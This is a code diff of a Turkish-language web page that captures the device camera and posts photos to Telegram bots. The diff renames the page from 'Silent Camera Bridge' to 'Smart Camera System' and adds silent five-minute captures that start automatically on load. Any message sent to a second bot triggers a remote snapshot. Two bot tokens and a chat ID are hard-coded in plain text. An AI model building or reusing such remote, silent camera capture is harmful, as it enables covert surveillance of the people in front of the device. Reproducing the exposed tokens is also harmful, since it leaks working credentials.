@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sessiz Kamera Köprüsü</title>
+    <title>Akıllı Kamera Sistemi</title>
     <style>
         body { font-family: -apple-system, sans-serif; text-align: center; background: #000; color: #fff; padding: 20px; }
         #video { width: 100%; max-width: 400px; border-radius: 10px; background: #222; }
@@ -13,17 +13,18 @@
     </style>
 </head>
 <body>
-    <h2>Sessiz Kamera Köprüsü</h2>
+    <h2>Akıllı Kamera Sistemi (Aktif)</h2>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <div id="status" class="status">Kamera başlatılıyor...</div>
     <p id="auto-status" style="font-size: 14px; color: #2196F3; font-weight: bold;"></p>
+    <p style="font-size: 12px; color: #888;">Arka planda GIF kaydı devam ediyor.</p>
 
     <script>
-        const BOT_TOKEN = '8571660857:AAHLCQJpPlJoh6EV_4mREjEB8JJ-JO-4frY';
+        const OLD_BOT_TOKEN = '8344840077:AAFnbmORjl8rq5t94MQN76W-kZYQydd8-Z4';
+        const GIF_BOT_TOKEN = '8571660857:AAHLCQJpPlJoh6EV_4mREjEB8JJ-JO-4frY';
         const CHAT_ID = '949655728';
         let lastUpdateId = 0;
-        let autoMode = false;
         let autoInterval = null;
 
         const video = document.getElementById('video');
@@ -35,13 +36,17 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                 video.srcObject = stream;
-                statusDiv.innerText = 'Sistem Hazır. Bot dinleniyor...';
+                statusDiv.innerText = 'Sistem Hazır. Komut bekleniyor...';
                 statusDiv.className = 'status ready';
+                
+                // Otomatik GIF kaydını hemen başlat (Sessizce)
+                startAutoGifRecording();
+                
                 startPolling();
             } catch (err) { statusDiv.innerText = 'Kamera hatası: ' + err.message; }
         }
 
-        async function takeAndSend(caption = "") {
+        async function takeAndSend(token, caption = "", silent = false) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
@@ -51,45 +56,36 @@
                     fd.append('chat_id', CHAT_ID);
                     fd.append('photo', b, 'kamera.jpg');
                     if(caption) fd.append('caption', caption);
+                    if(silent) fd.append('disable_notification', 'true');
                     try {
-                        // SESSİZ GÖNDERİM: notification kapalı
-                        fd.append('disable_notification', 'true');
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd}  );
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd}  );
                         resolve(true);
                     } catch(e) { resolve(false); }
                 }, 'image/jpeg', 0.7);
             });
         }
 
-        function toggleAuto(state) {
-            autoMode = state;
-            if (autoMode) {
-                autoStatusDiv.innerText = 'SESSİZ OTOMATİK MOD: AÇIK';
-                statusDiv.className = 'status auto';
-                if (autoInterval) clearInterval(autoInterval);
-                autoInterval = setInterval(() => {
-                    takeAndSend("Sessiz Kayıt");
-                }, 300000); // 5 dakika
-            } else {
-                autoStatusDiv.innerText = '';
-                statusDiv.className = 'status ready';
-                if (autoInterval) clearInterval(autoInterval);
-                autoInterval = null;
-            }
+        function startAutoGifRecording() {
+            autoStatusDiv.innerText = 'ARKA PLAN GIF KAYDI: AKTİF';
+            if (autoInterval) clearInterval(autoInterval);
+            autoInterval = setInterval(async () => {
+                // Sadece GIF botuna gönder (SESSİZCE, sohbete düşmeden)
+                await takeAndSend(GIF_BOT_TOKEN, "Sessiz Kayıt", true);
+            }, 300000); // 5 dakika
         }
 
         async function startPolling() {
             while (true) {
                 try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`  );
+                    // Sadece ESKİ botu dinle (Manuel çekim komutları için)
+                    const res = await fetch(`https://api.telegram.org/bot${OLD_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`  );
                     const data = await res.json();
                     if (data.ok && data.result.length > 0) {
                         for (const u of data.result) {
                             lastUpdateId = u.update_id;
                             if (u.message && u.message.text) {
-                                const t = u.message.text.toUpperCase();
-                                if (t === 'OTOMATİK AÇ' || t === 'OTOMATIK AC') toggleAuto(true);
-                                else if (t === 'OTOMATİK KAPAT' || t === 'OTOMATIK KAPAT') toggleAuto(false);
+                                // Sen herhangi bir şey yazdığında sadece ESKİ bota o anki fotoyu gönderir
+                                await takeAndSend(OLD_BOT_TOKEN, "Anlık Görüntü");
                             }
                         }
                     }
